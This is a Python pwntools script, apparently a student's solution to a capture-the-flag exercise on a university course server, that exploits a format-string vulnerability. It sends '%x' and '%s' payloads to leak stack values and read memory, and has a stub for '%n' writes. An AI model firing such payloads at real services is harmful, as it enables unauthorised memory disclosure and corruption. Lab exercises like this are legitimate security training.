#!/usr/bin/env python3
"""
Format String Vulnerability - Basic Format String
100 pts

Objetivo: Explorar el buffer utilizando format strings
"""

from pwn import remote

def connect():
    """Conectarse al servidor"""
    con = remote('ic.catedras.linti.unlp.edu.ar', 15019, timeout=5)
    return con

def explore_stack():
    """Explorar la pila con format strings"""
    con = connect()
    
    print("[*] Banner recibido:")
    banner = con.recvuntil(b"input:")
    banner_text = banner.decode(errors='replace')
    print(banner_text)
    
    # Extraer la dirección del buffer
    import re
    match = re.search(r'0x([0-9a-fA-F]+)', banner_text)
    if match:
        buffer_addr = f"0x{match.group(1)}"
        print(f"[+] Buffer detectado en: {buffer_addr}")
    
    # Enviar un format string para leer valores de la pila
    print("\n[*] Enviando format string para explorar la pila...")
    payload = b"%x.%x.%x.%x.%x.%x.%x.%x.%x.%x"
    con.sendline(payload)
    
    respuesta = con.recvall(timeout=3)
    print("[+] Respuesta (hex de pila):")
    output = respuesta.decode(errors='replace')
    print(output)
    
    # Convertir a decimal para análisis
    print("\n[+] Valores en decimal:")
    values = output.strip().split('.')
    for i, val in enumerate(values):
        try:
            dec = int(val, 16)
            print(f"  [{i}] {val} (hex) = {dec} (dec)")
        except:
            print(f"  [{i}] {val} (no hex)")
    
    con.close()
    return output

def leak_memory_ascii():
    """Intentar leer memoria como ASCII"""
    con = connect()
    
    banner = con.recvuntil(b"input:")
    
    # %s intenta leer como string (puntero a memoria)
    print("\n[*] Intentando leer memoria como strings (%s)...")
    payload = b"%s.%s.%s.%s.%s"
    con.sendline(payload)
    
    try:
        respuesta = con.recvall(timeout=3)
        print("[+] Respuesta:")
        print(respuesta.decode(errors='replace'))
    except Exception as e:
        print(f"[-] Error (esperado - puede haber crash): {e}")
    
    try:
        con.close()
    except:
        pass

def test_write():
    """Intentar escribir en memoria"""
    con = connect()
    
    banner = con.recvuntil(b"input:")
    buffer_addr = banner.decode(errors='replace').split(': ')[1].split('\n')[0]
    print(f"\n[*] Buffer en: {buffer_addr}")
    
    # Construir payload para escribir
    # Formato: dirección + %n (escribe)
    try:
        addr = int(buffer_addr, 16)
        print(f"[*] Dirección en decimal: {addr}")
        
        # Simple test
        payload = f"%x.%x.%x.%x.%x.%x.%x".encode()
        con.sendline(payload)
        
        respuesta = con.recvall(timeout=3)
        print("[+] Output:")
        print(respuesta.decode(errors='replace'))
    except Exception as e:
        print(f"[-] Error: {e}")
    
    try:
        con.close()
    except:
        pass

if __name__ == "__main__":
    print("="*70)
    print("FORMAT STRING VULNERABILITY - EXPLOITATION")
    print("="*70)
    
    try:
        # Fase 1: Explorar la pila
        explore_stack()
        
        # Fase 2: Intentar leer memoria
        leak_memory_ascii()
        
        # Fase 3: Intentar escritura
        test_write()
        
    except Exception as e:
        print(f"[-] Error general: {e}")
        import traceback
        traceback.print_exc()
